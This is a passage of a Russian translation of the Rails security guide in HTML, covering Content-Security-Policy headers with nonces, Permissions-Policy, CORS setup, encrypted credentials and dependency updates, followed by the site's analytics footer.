+<h4 id='zagolovok-content-security-policy' class='inside_page_header'><a href="#zagolovok-content-security-policy">9.3.</a> Заголовок <code>Content-Security-Policy</code></h4><p>Чтобы помочь защититься от атак XSS и инъекций, рекомендуется определить заголовок отклика <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> для вашего приложения. Rails предоставляет DSL, который разрешает конфигурировать заголовок.</p><p>Определите политику безопасности в подходящем инициализаторе:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="c1"># config/initializers/content_security_policy.rb</span>
+<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">default_src</span> <span class="ss">:self</span><span class="p">,</span> <span class="ss">:https</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">font_src</span>    <span class="ss">:self</span><span class="p">,</span> <span class="ss">:https</span><span class="p">,</span> <span class="ss">:data</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">img_src</span>     <span class="ss">:self</span><span class="p">,</span> <span class="ss">:https</span><span class="p">,</span> <span class="ss">:data</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">object_src</span>  <span class="ss">:none</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">script_src</span>  <span class="ss">:self</span><span class="p">,</span> <span class="ss">:https</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">style_src</span>   <span class="ss">:self</span><span class="p">,</span> <span class="ss">:https</span>
+  <span class="c1"># Указываем URI для отчетов о нарушениях</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">report_uri</span> <span class="s2">"/csp-violation-report-endpoint"</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Глобально сконфигурированная политика может быть переопределена на основе ресурса:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">class</span> <span class="nc">PostsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
+  <span class="n">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
+    <span class="n">policy</span><span class="p">.</span><span class="nf">upgrade_insecure_requests</span> <span class="kp">true</span>
+    <span class="n">policy</span><span class="p">.</span><span class="nf">base_uri</span> <span class="s2">"https://www.example.com"</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Или она может быть отключена:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">class</span> <span class="nc">LegacyPagesController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
+  <span class="n">content_security_policy</span> <span class="kp">false</span><span class="p">,</span> <span class="ss">only: :index</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Используйте лямбды для внедрения значений для запроса, таких как поддомен аккаунта в мульти-арендном приложении:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">class</span> <span class="nc">PostsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
+  <span class="n">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
+    <span class="n">policy</span><span class="p">.</span><span class="nf">base_uri</span> <span class="ss">:self</span><span class="p">,</span> <span class="o">-&gt;</span> <span class="p">{</span> <span class="s2">"https://</span><span class="si">#{</span><span class="n">current_user</span><span class="p">.</span><span class="nf">domain</span><span class="si">}</span><span class="s2">.example.com"</span> <span class="p">}</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<h5 id='reporting-violations' class='inside_page_header'><a href="#reporting-violations">9.3.1.</a>  Отчет о нарушениях</h5><p>Включите директиву <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri"><code>report-uri</code></a>, чтобы сообщить о нарушениях для указанного URI:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">report_uri</span> <span class="s2">"/csp-violation-report-endpoint"</span>
+</code></pre>
+</div>
+<p>При миграции устаревшего содержимого, вы, возможно, не хотите сообщать о нарушениях без принуждения к политике. Установите заголовок отклика <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only"><code>Content-Security-Policy-Report-Only</code></a>, чтобы сообщать только о нарушениях.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_report_only</span> <span class="o">=</span> <span class="kp">true</span>
+</code></pre>
+</div>
+<p>Или переопределите его в контроллере:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">class</span> <span class="nc">PostsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
+  <span class="n">content_security_policy_report_only</span> <span class="ss">only: :index</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<h5 id='adding-a-nonce' class='inside_page_header'><a href="#adding-a-nonce">9.3.2.</a>  Добавление Nonce</h5><p>Если вы рассматриваете <code>&#39;unsafe-inline&#39;</code>, рассмотрите вместо этого использование nonce. <a href="https://www.w3.org/TR/CSP3/#security-nonces">Nonce предоставляют заменимое улучшение</a> над <code>&#39;unsafe-inline&#39;</code> при реализации Content Security Policy поверх существующего кода.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="c1"># config/initializers/content_security_policy.rb</span>
+<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">script_src</span> <span class="ss">:self</span><span class="p">,</span> <span class="ss">:https</span>
+<span class="k">end</span>
+
+<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_nonce_generator</span> <span class="o">=</span> <span class="o">-&gt;</span> <span class="n">request</span> <span class="p">{</span> <span class="no">SecureRandom</span><span class="p">.</span><span class="nf">base64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="p">}</span>
+</code></pre>
+</div>
+<p>Есть несколько компромиссов, которые нужно рассмотреть при настройке генератора nonce. Использование <code>SecureRandom.base64(16)</code> это хорошее значение по умолчанию, так как он сгенерирует новый случайный nonce для каждого запроса. Однако, этот метод несовместим с <a href="/caching-with-rails#conditional-get-support">кэшированием GET с условием</a>, так как новые nonce приведут к новым значениям ETag для каждого запроса. Альтернативой к случайным nonce для каждого запроса будет использование идентификатора сессии:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_nonce_generator</span> <span class="o">=</span> <span class="o">-&gt;</span> <span class="n">request</span> <span class="p">{</span> <span class="n">request</span><span class="p">.</span><span class="nf">session</span><span class="p">.</span><span class="nf">id</span><span class="p">.</span><span class="nf">to_s</span> <span class="p">}</span>
+</code></pre>
+</div>
+<p>Этот метод генерации совместим с ETag, но его безопасность зависит от того, достаточно ли случаен идентификатор сессии, и не раскрыт ли он в небезопасных куки.</p><p>По умолчанию nonce будут применены к <code>script-src</code> и <code>style-src</code>, если определен генератор nonce. Можно использовать <code>config.content_security_policy_nonce_directives</code>, чтобы изменить, какая директива будет использовать nonce:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_nonce_directives</span> <span class="o">=</span> <span class="sx">%w(script-src)</span>
+</code></pre>
+</div>
+<p>Как только генерация nonce настроена в инициализаторе, можно добавить автоматические значения nonce в теги script, передавая <code>nonce: true</code> как часть <code>html_options</code>:</p><div class="code_container">
+  <pre><code class="highlight erb"><span class="cp">&lt;%=</span> <span class="n">javascript_tag</span> <span class="ss">nonce: </span><span class="kp">true</span> <span class="k">do</span> <span class="cp">-%&gt;</span>
+  alert('Hello, World!');
+<span class="cp">&lt;%</span> <span class="k">end</span> <span class="cp">-%&gt;</span>
+</code></pre>
+</div>
+<p>Это также работает с <code>javascript_include_tag</code>:</p><div class="code_container">
+  <pre><code class="highlight erb"><span class="cp">&lt;%=</span> <span class="n">javascript_include_tag</span> <span class="s2">"script"</span><span class="p">,</span> <span class="ss">nonce: </span><span class="kp">true</span> <span class="cp">%&gt;</span>
+</code></pre>
+</div>
+<p>Используйте хелпер <a href="https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag"><code>csp_meta_tag</code></a> для создания метатега &quot;csp-nonce&quot; со значением nonce для каждой сессии, чтобы разрешить встроенные теги <code>&lt;script&gt;</code>.</p><div class="code_container">
+  <pre><code class="highlight erb"><span class="nt">&lt;head&gt;</span>
+  <span class="cp">&lt;%=</span> <span class="n">csp_meta_tag</span> <span class="cp">%&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+</code></pre>
+</div>
+<p>Это используется хелпером Rails UJS для создания динамически загружаемых встроенных элементов <code>&lt;script&gt;</code>.</p><h4 id='zagolovok-feature-policy' class='inside_page_header'><a href="#zagolovok-feature-policy">9.4.</a> Заголовок <code>Feature-Policy</code></h4><div class="note"><p>Заголовок <code>Feature-Policy</code> был переименован в <code>Permissions-Policy</code>. <code>Permissions-Policy</code> требует другую реализацию и пока не поддерживается всеми браузерами. Чтобы избежать переименования этой промежуточной программы в будущем, мы используем новое имя для этой промежуточной программы, но пока сохраняем старое имя заголовка и его реализацию.</p></div><p>Чтобы разрешить или заблокировать использование особенностей браузера, можно определить заголовок отклика <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy"><code>Feature-Policy</code></a> для вашего приложения. Rails предоставляет DSL, позволяющий настроить заголовок.</p><p>Определите политику в соответствующем инициализаторе:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="c1"># config/initializers/permissions_policy.rb</span>
+<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">permissions_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">camera</span>      <span class="ss">:none</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">gyroscope</span>   <span class="ss">:none</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">microphone</span>  <span class="ss">:none</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">usb</span>         <span class="ss">:none</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">fullscreen</span>  <span class="ss">:self</span>
+  <span class="n">policy</span><span class="p">.</span><span class="nf">payment</span>     <span class="ss">:self</span><span class="p">,</span> <span class="s2">"https://secure.example.com"</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Глобально настроенная политика может быть переопределена на основе ресурса:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">class</span> <span class="nc">PagesController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
+  <span class="n">permissions_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
+    <span class="n">policy</span><span class="p">.</span><span class="nf">geolocation</span> <span class="s2">"https://example.com"</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<h4 id='sovmestnoe-mezhsaytovoe-ispolzovanie-resursov' class='inside_page_header'><a href="#sovmestnoe-mezhsaytovoe-ispolzovanie-resursov">9.5.</a> Совместное межсайтовое использование ресурсов</h4><p>Браузеры ограничивают межсайтовые запросы HTTP, инициированные скриптами. Если хотите запускать Rails в качестве API, а фронтенд приложение - на отдельном домене, следует включить <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing</a> (CORS).</p><p>Можно использовать промежуточную программу <a href="https://github.com/cyu/rack-cors">Rack CORS</a> для обработки CORS. Если вы сгенерировали свое приложение с помощью опции <code>--api</code>, Rack CORS, возможно, уже настроен, и вы можете опустить следующие шаги.</p><p>Для начала, добавьте гем rack-cors в свой Gemfile:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">gem</span> <span class="s1">'rack-cors'</span>
+</code></pre>
+</div>
+<p>Затем добавьте инициализатор, чтобы настроить промежуточную программу:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="c1"># config/initializers/cors.rb</span>
+<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">middleware</span><span class="p">.</span><span class="nf">insert_before</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">"Rack::Cors"</span> <span class="k">do</span>
+  <span class="n">allow</span> <span class="k">do</span>
+    <span class="n">origins</span> <span class="s1">'example.com'</span>
+
+    <span class="n">resource</span> <span class="s1">'*'</span><span class="p">,</span>
+      <span class="ss">headers: :any</span><span class="p">,</span>
+      <span class="ss">methods: </span><span class="p">[</span><span class="ss">:get</span><span class="p">,</span> <span class="ss">:post</span><span class="p">,</span> <span class="ss">:put</span><span class="p">,</span> <span class="ss">:patch</span><span class="p">,</span> <span class="ss">:delete</span><span class="p">,</span> <span class="ss">:options</span><span class="p">,</span> <span class="ss">:head</span><span class="p">]</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<h3 id='bezopasnost-sredy' class='inside_page_header'><a href="#bezopasnost-sredy">10.</a> Безопасность среды</h3><p>За пределами этого руководства осталось, как обезопасить код приложения и среды (environments). Однако, пожалуйста, обеспечьте безопасность конфигурации вашей базы данных, т.е. <code>config/database.yml</code>, главного ключа для <code>credentials.yml</code> и других незашифрованных секретных данных. Для дальнейшего ограничения доступа используйте специфичные для сред версии этих и любых других файлов, которые могут содержать чувствительную информацию.</p><h4 id='custom-credentials' class='inside_page_header'><a href="#custom-credentials">10.1.</a>  Настраиваемые учетные данные</h4><p>Rails хранит секретные данные в <code>config/credentials.yml.enc</code>, которые зашифрованы, и поэтому не могут быть непосредственно отредактированы. Rails использует <code>config/master.key</code>, или альтернативно ищет переменную среды <code>ENV[&quot;RAILS_MASTER_KEY&quot;]</code> для шифровки файла учетных данных. Так как файл учетных данных зашифрован, его можно хранить в контроле версий, пока главный ключ держится в безопасности.</p><p>По умолчанию файл учетных данных содержит секретный ключ приложения <code>secret_key_base</code>. Он также может использоваться для хранения других учетных данных, таких как ключи доступа к внешним API.</p><p>Чтобы отредактировать файл учетных данных, запустите <code>bin/rails credentials:edit</code>. Эта команда создаст файл учетных данных, если он не существует. Помимо этого, команда создаст <code>config/master.key</code>, если главный ключ не определен.</p><p>Секреты, добавленные в файл учетных данных, доступны через <code>Rails.application.credentials</code>. Например, со следующим дешифрованным <code>config/credentials.yml.enc</code>:</p><div class="code_container">
+  <pre><code class="highlight yaml"><span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">3b7cd72...</span>
+<span class="na">some_api_key</span><span class="pi">:</span> <span class="s">SOMEKEY</span>
+<span class="na">system</span><span class="pi">:</span>
+  <span class="na">access_key_id</span><span class="pi">:</span> <span class="s">1234AB</span>
+</code></pre>
+</div>
+<p><code>Rails.application.credentials.some_api_key</code> вернет <code>&quot;SOMEKEY&quot;</code>. <code>Rails.application.credentials.system.access_key_id</code> вернет <code>&quot;1234AB&quot;</code>.</p><p>Если вы хотите вызвать исключение, когда ключ пустой, можно использовать версию с восклицательным знаком:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="c1"># Когда some_api_key пустой...</span>
+<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">credentials</span><span class="p">.</span><span class="nf">some_api_key!</span> <span class="c1"># =&gt; KeyError: :some_api_key is blank</span>
+</code></pre>
+</div>
+<div class="info"><p>Изучите подробности об учетных данных с помощью <code>bin/rails credentials:help</code>.</p></div><div class="warning"><p>Храните ваш главный ключ в безопасности. Не добавляйте ваш главный ключ в систему контроля версий.</p></div><h3 id='upravlenie-zavisimostyami-i-baza-uyazvimostey-cve' class='inside_page_header'><a href="#upravlenie-zavisimostyami-i-baza-uyazvimostey-cve">11.</a> Управление зависимостями и база уязвимостей CVE</h3><p>Мы не обновляем зависимости только для поощрения использования новых версий, в том числе и по причинам безопасности. Поэтому владельцы приложения должны обновить свои гемы вручную, независимо от наших усилий. Используйте <code>bundle update --conservative gem_name</code> для безопасного обновления уязвимых зависимостей.</p><h3 id='additional-resources' class='inside_page_header'><a href="#additional-resources">12.</a>  Дополнительные источники</h3><p>Картина безопасности меняется, и важно идти в ногу со временем, поскольку пропуск новой уязвимости может быть катастрофическим. Ниже перечислены дополнительные источники о безопасности (Rails):</p><ul><li>Подпишитесь на <a href="https://groups.google.com/forum/#!forum/rubyonrails-security">рассылку</a> о безопасности Rails.
+</li><li><a href="https://brakemanscanner.org/">Brakeman - сканер безопасности Rails</a> - Для выполнения статического анализа безопасности для Rails приложений.
+</li><li><a href="https://infosec.mozilla.org/guidelines/web_security.html">Mozilla&#39;s Web Security Guidelines</a> - Рекомендации по темам, покрывающим Content Security Policy, заголовки HTTP, Cookies, конфигурация TLS и т.д.
+</li><li><a href="https://owasp.org/">Хороший блог по безопасности</a>, включающий <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">Шпаргалку по XSS</a>.
+</li></ul>
+
+            <div class="banner">
+              <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+   <!-- bottom rusrails -->
+   <ins class="adsbygoogle"
+        style="display:inline-block;width:580px;height:400px"
+        data-ad-client="ca-pub-7764391801669990"
+        data-ad-slot="7566253867"></ins>
+
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+            </div>
+          </div>
+        </div>
+        <div class="row-fluid">
+          <div class="span12" id="footer">
+            <p>
+              <a target="blank" href="https://github.com/rusrails/rusrails"><img src="/assets/github-7cc23602a5ac2465f14c19492358a5a67dc24636761cc723e4d621cea0c09225.png" /></a>
+              <a target="blank" href="http://twitter.com/rusrails"><img src="/assets/twitter-50e0e767c8793dec313a7dc5cfbcfe2067e3e89ea6ec64784eb7c6640f578758.png" /></a>
+            </p>
+            <p>
+              <a href="https://creativecommons.org/licenses/by-sa/4.0/">Лицензия CC BY-SA 4.0</a>
+              "Rails", "Ruby on Rails" и логотип Rails - торговые марки DHH
+              <!-- Yandex.Metrika counter -->
+<script>
+  (function (d, w, c) {
+    (w[c] = w[c] || []).push(function() {
+        try {
+            w.yaCounter1006929 = new Ya.Metrika({id:1006929,
+                    webvisor:true,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true});
+        } catch(e) { }
+    });
+
+    var n = d.getElementsByTagName("script")[0],
+        s = d.createElement("script"),
+        f = function () { n.parentNode.insertBefore(s, n); };
+    s.type = "text/javascript";
+    s.async = true;
+    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+    if (w.opera == "[object Opera]") {
+        d.addEventListener("DOMContentLoaded", f, false);
+    } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+
+<noscript>
+  <div>
+    <img style="position:absolute; left:-9999px;" alt="" src="//mc.yandex.ru/watch/1006929" />
+  </div>
+</noscript>
+<!-- /Yandex.Metrika counter -->
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-64955373-1', 'auto');
+  ga('send', 'pageview');
+
+  var trackOutboundLink = function(url) {
+    ga('send', 'event', 'outbound', 'click', url, {
+      'transport': 'beacon',
+      'hitCallback': function(){ }
+    });
+  }
+</script>
+
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="to_top" style="display: block">
+      <div class="to_top_panel"></div>
+    </div>
+    <script src="/assets/application-8ee447905888b153d8458707061a14b1f15f69b6733e871a3ad91d80ae89e87b.js"></script>
+  </body>
+</html>
